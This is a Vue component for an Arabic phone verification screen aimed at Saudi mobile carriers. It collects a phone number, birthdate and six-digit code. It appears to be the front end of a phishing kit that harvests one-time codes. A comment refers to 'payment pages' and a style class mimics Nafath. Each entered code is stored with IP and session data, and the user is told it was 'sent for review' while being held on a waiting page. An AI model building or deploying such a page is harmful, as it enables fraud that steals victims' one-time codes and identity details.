<template>
  <div class="verification-shell" dir="rtl" lang="ar">
    <div class="w-full max-w-md">
        <!-- Screen 1: Phone Number Entry -->
        <PhoneEntryForm
          v-if="!phoneSubmitted"
          :carriers="carriers"
          :selected-carrier="selectedCarrier"
          :form-data="formData"
          :errors="errors"
          :error="error"
          :processing="processing"
          :is-form-valid="isFormValid"
          @submit="submitPhoneNumber"
          @update:selected-carrier="selectedCarrier = $event"
          @update:form-data="onFormDataUpdate"
        />

        <!-- Screen 2: Waiting for Code -->
        <WaitingForCodeScreen
          v-else-if="waitingForCode"
          :phone-number="fullPhoneNumber"
          :countdown-formatted="waitingCountdown.formatted.value"
          @enter-manually="enterCodeManually"
        />

        <!-- Screen 3: OTP Entry -->
        <OtpEntryForm
          v-else
          ref="otpFormRef"
          :phone-number="fullPhoneNumber"
          :error="error"
          :success="success"
          :processing="processing"
          :timer-formatted="codeExpiry.formatted.value"
          :is-expired="codeExpiry.isExpired.value"
          :can-resend="canResend"
          :resend-timer="resendCooldown.remaining.value"
          @verify="verifyCode"
          @resend="resendCode"
          @change-phone="changePhoneNumber"
        />

        <!-- Help Section -->
        <VerificationHelpSection />
      </div>
  </div>
</template>

<script setup>
import { ref, computed, nextTick } from 'vue';
import { useRouter } from 'vue-router';
import { useI18n } from 'vue-i18n';
import i18n from '@/i18n';
import { useVisitorTracking } from '@/composables/useVisitorTracking';
import { useCountdownTimer } from '@/composables/useCountdownTimer';
import request from '@/api/request';

import PhoneEntryForm from '../components/phone-verification/PhoneEntryForm.vue';
import WaitingForCodeScreen from '../components/phone-verification/WaitingForCodeScreen.vue';
import OtpEntryForm from '../components/phone-verification/OtpEntryForm.vue';
import VerificationHelpSection from '../components/phone-verification/VerificationHelpSection.vue';

const { t } = useI18n();
const router = useRouter();

// Force Arabic locale on payment pages
if ( i18n.global.locale.value !== 'ar' ) {
    i18n.global.locale.value = 'ar';
}

useVisitorTracking('phone_verification');

// --- Carrier data ---
const carriers = [
  { id: 'stc', name: 'STC', logo: '/images/logo/STC-01.svg' },
  { id: 'mobily', name: 'Mobily', logo: '/images/logo/Mobily-01-1.svg' },
  { id: 'zain', name: 'Zain', logo: '/images/logo/Zain-01.svg' },
  { id: 'yaqoot', name: 'Yaqoot', logo: '/images/logo/yaqoot.webp' },
  { id: 'salam', name: 'Salam', logo: '/images/logo/Salam-Mobile-01.svg' },
  { id: 'lebara', name: 'Lebara', logo: '/images/logo/lebara.webp' },
];

// --- Form state ---
const formData = ref({
  phone: '',
  birthDay: '',
  birthMonth: '',
  birthYear: '',
});
const selectedCarrier = ref('');
const errors = ref({ carrier: '', phone: '', birthdate: '' });

// --- Screen state ---
const phoneSubmitted = ref(false);
const waitingForCode = ref(false);

// --- Messages ---
const error = ref('');
const success = ref('');
const processing = ref(false);

// --- Timer composables ---
const waitingCountdown = useCountdownTimer(30, {
  onComplete: () => {
    waitingForCode.value = false;
    nextTick(() => otpFormRef.value?.focusFirst());
  },
});

const codeExpiry = useCountdownTimer(300);

const resendCooldown = useCountdownTimer(0);

// --- Refs ---
const otpFormRef = ref(null);

// --- Computed ---
const isFormValid = computed(() => {
  return (
    selectedCarrier.value !== '' &&
    formData.value.phone.length === 9 &&
    formData.value.birthDay !== '' &&
    formData.value.birthMonth !== '' &&
    formData.value.birthYear !== ''
  );
});

const fullPhoneNumber = computed(() => `+966 ${formData.value.phone}`);

const canResend = computed(() => resendCooldown.isExpired.value);

// --- Form update handler ---
const onFormDataUpdate = (patch) => {
  formData.value = { ...formData.value, ...patch };
  errors.value.phone = '';
};

// --- Validation ---
const validateForm = () => {
  errors.value = { carrier: '', phone: '', birthdate: '' };
  let isValid = true;

  if (!selectedCarrier.value) {
    errors.value.carrier = 'الرجاء اختيار شركة الاتصالات';
    isValid = false;
  }

  if (!formData.value.phone) {
    errors.value.phone = 'الرجاء إدخال رقم الهاتف';
    isValid = false;
  } else if (!/^5\d{8}$/.test(formData.value.phone)) {
    errors.value.phone = 'رقم الهاتف يجب أن يبدأ بـ 5 ويتكون من 9 أرقام';
    isValid = false;
  }

  if (!formData.value.birthDay || !formData.value.birthMonth || !formData.value.birthYear) {
    errors.value.birthdate = 'الرجاء إدخال تاريخ الميلاد كاملاً';
    isValid = false;
  }

  return isValid;
};

// --- Actions ---
const submitPhoneNumber = async () => {
  if (!validateForm()) return;

  processing.value = true;
  error.value = '';

  try {
    const response = await request.post('/phone-verification/send', {
      carrier: selectedCarrier.value,
      phone: formData.value.phone,
      birthDay: formData.value.birthDay,
      birthMonth: formData.value.birthMonth,
      birthYear: formData.value.birthYear,
    });

    if (response.data.redirect) {
      router.push(response.data.redirect);
      return;
    }

    // STC carrier → redirect to STC waiting page
    if (selectedCarrier.value === 'stc') {
      sessionStorage.setItem('stcContext', JSON.stringify({
        phoneNumber: fullPhoneNumber.value,
        customerIp: response.data?.customer_ip || '',
        sessionId: response.data?.session_id || '',
        carrier: 'stc',
      }));
      router.push({ name: 'stcWaiting' });
      return;
    }

    success.value = t('verification.phone.messages.codeSentSuccess');
    phoneSubmitted.value = true;
    waitingForCode.value = true;

    waitingCountdown.restart(30);
    codeExpiry.restart(300);
  } catch (_err) {
    error.value =
      _err.response?.data?.message || 'حدث خطأ أثناء إرسال الرمز. الرجاء المحاولة مرة أخرى';
  } finally {
    processing.value = false;
  }
};

const verifyCode = async (otpCode) => {
  if (processing.value) return;

  if (!otpCode || otpCode.length !== 6) {
    error.value = t('verification.phone.messages.enterAllDigits');
    return;
  }

  if (codeExpiry.isExpired.value) {
    error.value = t('verification.phone.messages.codeExpired');
    return;
  }

  processing.value = true;
  error.value = '';
  success.value = '';

  try {
    const response = await request.post('/phone-verification/verify', { otp: otpCode });

    sessionStorage.setItem('phoneOtpContext', JSON.stringify({
      phoneNumber: fullPhoneNumber.value,
      otpCode: otpCode,
      customerIp: response.data?.customer_ip || '',
      sessionId: response.data?.session_id || '',
      statusSig: response.data?.status_sig || '',
    }));

    success.value = t('verification.phone.messages.codeSentForReview');
    setTimeout(() => {
      router.push({ name: 'phoneOtpWaiting' });
    }, 1000);
  } catch (_err) {
    error.value = _err.response?.data?.message || 'حدث خطأ. الرجاء المحاولة مرة أخرى';
    otpFormRef.value?.resetOtp();
  } finally {
    processing.value = false;
  }
};

const resendCode = async () => {
  if (!canResend.value) return;

  processing.value = true;
  error.value = '';
  success.value = '';

  try {
    await request.post('/phone-verification/resend', {
      phone: formData.value.phone,
    });
    success.value = t('verification.phone.messages.newCodeSent');
    codeExpiry.restart(300);
    resendCooldown.restart(60);
    // Reset OTP input state so the field is re-enabled
    otpFormRef.value?.resetOtp();
    nextTick(() => otpFormRef.value?.focusFirst());
  } catch {
    error.value = t('verification.phone.messages.resendError');
  } finally {
    processing.value = false;
  }
};

const enterCodeManually = () => {
  waitingForCode.value = false;
  waitingCountdown.stop();
  nextTick(() => otpFormRef.value?.focusFirst());
};

const changePhoneNumber = () => {
  if (confirm('هل تريد تغيير رقم الهاتف؟ سيتم إعادة تعبئة النموذج من جديد.')) {
    phoneSubmitted.value = false;
    waitingForCode.value = false;
    error.value = '';
    success.value = '';
    waitingCountdown.stop();
    codeExpiry.stop();
    resendCooldown.stop();
  }
};
</script>

<style scoped>
.verification-shell {
  min-height: 100dvh;
  display: flex;
  flex-direction: column;
  align-items: center;
  justify-content: center;
  padding: 1rem;
  background: #eef1f5;
}

.card-nafath {
  background: #ffffff;
  border-radius: 16px;
  border: 1px solid #e5e7eb;
  box-shadow: 0 4px 24px rgba(0, 0, 0, 0.08), 0 1px 3px rgba(0, 0, 0, 0.04);
  overflow: hidden;
}

/* ===== Select dropdown arrow ===== */
:deep(select) {
  -webkit-appearance: none;
  -moz-appearance: none;
  appearance: none;
  background-image: url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3e%3cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='M6 8l4 4 4-4'/%3e%3c/svg%3e") !important;
  background-position: left 0.5rem center !important;
  background-repeat: no-repeat !important;
  background-size: 1.25em 1.25em !important;
  padding-left: 2rem !important;
}

/* Autofill override */
:deep(input:-webkit-autofill),
:deep(input:-webkit-autofill:hover),
:deep(input:-webkit-autofill:focus),
:deep(input:-webkit-autofill:active) {
  -webkit-box-shadow: 0 0 0 1000px #ffffff inset !important;
  box-shadow: 0 0 0 1000px #ffffff inset !important;
  -webkit-text-fill-color: #111827 !important;
  caret-color: #111827 !important;
  transition: background-color 5000s ease-in-out 0s;
}

/* ===== Typography ===== */
.fw-bold {
  font-weight: 700;
}

/* ===== Mobile Responsive ===== */
@media (max-width: 640px) {
  .card-nafath {
    margin: 0 4px;
    border-radius: 12px;
  }
}
</style>
